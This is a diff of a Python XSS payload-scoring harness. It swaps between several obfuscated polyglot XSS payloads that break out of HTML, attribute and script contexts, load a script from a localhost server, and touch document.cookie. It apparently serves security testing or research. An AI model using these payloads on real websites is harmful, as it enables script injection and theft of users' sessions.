@@ -128,15 +128,12 @@ def evaluate_xss_payload(payload):
     print(total_score, "/", len(endpoints))
     return total_score, score_vector
 
-xss_payload = """
-</teMplAte>iMg SrC="http://localhost:8080/xss.js" OneRror="document.cookie=1"`/*\x20<img</tITle></iNpUt><body</auDio></ifRaMe></hTmL></StYle><ScRiPt sRc='http://localhost:8080/xss.js'></ScRiPt>]%20<iMg SrC='http://localhost:8080/xss.js' OneRror='document.cookie=1'>aa</ifRaMe>'</frAmEsEt></nOeMbed>iMg SrC="http://localhost:8080/xss.js" OneRror="document.cookie=1"-->'document.cookie=1']%26quot;</noScRIpt>>%26%2360;%26quot;<ScRiPt sRc="http://localhost:8080/xss.js"></ScRiPt>\x3e</texTarEa><ScRiPt sRc='http://localhost:8080/xss.js'></ScRiPt>
-"""
-
+# xss_payload = """<svg</noScRIpt><ScRiPt>document.cookie=1</ScRiPt><ScRiPt sRc='https://localhost:8080/xss.js'></ScRiPt></nOeMbed> oNeRrOr='document.cookie=1''</hTmL>} sRc=</StYle>*/</teMplAte></ifRaMe>--!>*/;</texTarEa></tITle><iMg SrC OneRror='document.cookie=1'>" oNeRrOr='document.cookie=1'/ oNLoAd='document.cookie=1' """
 # xss_payload = """
 # <IfRame</tITle><ScRiPt sRc="http://localhost:8080/xss.js"></ScRiPt>iMg SrC="http://localhost:8080/xss.js" OneRror="document.cookie=1")sCrIpTscript</nOeMbed></tITle></StYle></noScRIpt></teMplAte></ifRaMe>dIv"</texTarEa><ScRiPt sRc="http://localhost:8080/xss.js"></ScRiPt>*/</iNpUt>'*/iMg SrC="http://localhost:8080/xss.js" OneRror="document.cookie=1"<iframe%3C<img%26%2339;\x20</frAmEsEt>--!>[*http://localhost:8080/xss.js<iMg SrC='http://localhost:8080/xss.js' OneRror='document.cookie=1'>
 # """
 
-# xss_payload = """jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk='document.cookie=1' )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd='document.cookie=1'//>\x3e
+xss_payload = """jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk='document.cookie=1' )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd='document.cookie=1'//>\x3e
 # """
 
 
